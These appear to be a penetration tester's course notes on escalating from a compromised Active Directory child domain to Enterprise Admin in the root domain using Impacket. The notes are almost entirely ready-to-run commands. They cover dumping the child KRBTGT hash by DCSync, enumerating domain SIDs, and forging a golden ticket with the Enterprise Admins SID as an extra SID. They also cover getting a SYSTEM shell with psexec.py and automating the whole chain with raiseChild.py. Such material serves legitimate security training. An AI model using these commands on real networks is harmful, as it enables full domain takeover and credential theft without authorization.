To perform this attack, we need the same information as the “From WIndows” section
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
  
# Performing DCSync to get KRBTGT Hash
```JavaScript
secretsdump.py <CHILD_DOMAIN>/<user>@<IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
```
- for their example, they used just “LOGISTICS” for the child domain parameter before krbtgt
    
    - LOGISTICS/krbtgt
    
![[/image 354.png|image 354.png]]
  
# Performing SID Brute Forcing with Lookupsid.py
if you only want domain SIDs, grep with “Domain SID”
```JavaScript
lookupsid.py <CHILD_DOMAIN>/<user>@<IP> | grep "Domain SID"
```
![[/image 1 262.png|image 1 262.png]]
  
# Grabbing the Domain SID & Attaching to Enterprise Admin’s RID
```JavaScript
lookupsid.py <CHILD_DOMAIN>/<user>@<root_DC_IP> | grep -B12 "Enterprise Admins"
```
![[/image 2 225.png|image 2 225.png]]
- RID of Enterprise Admins is 519 - attach this to root Domain SID to get Enterprise Admin SID
    
    - Domain SID is at top of the output
    
    - full Enterprise Admin SID in this case would be “S-1-5-21-3842939050-3880317879-2865463114-519”
    
  
  
# Create Golden Ticket using Ticketer.py
```JavaScript
ticketer.py -nthash <KRBTGT_hash> -domain <CHILD_DOMAIN> -domain-sid <child_SID> -extra-sid <enterprise_admin_sid> hacker
```
![[/image 3 195.png|image 3 195.png]]
- saves golden ticket to ccache file
  
Set KRB5CCNAME using new ccache file
```JavaScript
export KRB5CCNAME=hacker.ccache
```
  
# Getting System Shell with psexec.py
```JavaScript
psexec.py <CHILD_DOMAIN>/hacker@<parent_dc_name>.<root_domain> -k -no-pass -target-ip <IP>
```
  
# Performing the Attack with raiseChild.py
- [raiseChild.py](http://raiseChild.py) will do all of the above for you, we just need to specify the target DC and credentials for an administrative user on the child domain
    
    - if you specify the “target-exec” flag, it will get a shell with psexec.py
    
```JavaScript
raiseChild.py -target-exec <root_DC_IP> <CHILD_DOMAIN>/<admin_user>
```
![[/image 4 171.png|image 4 171.png]]
- if psexec doesn’t work, doing [raiseChild.py](http://raiseChild.py) will give you the Administrator’s hash anyways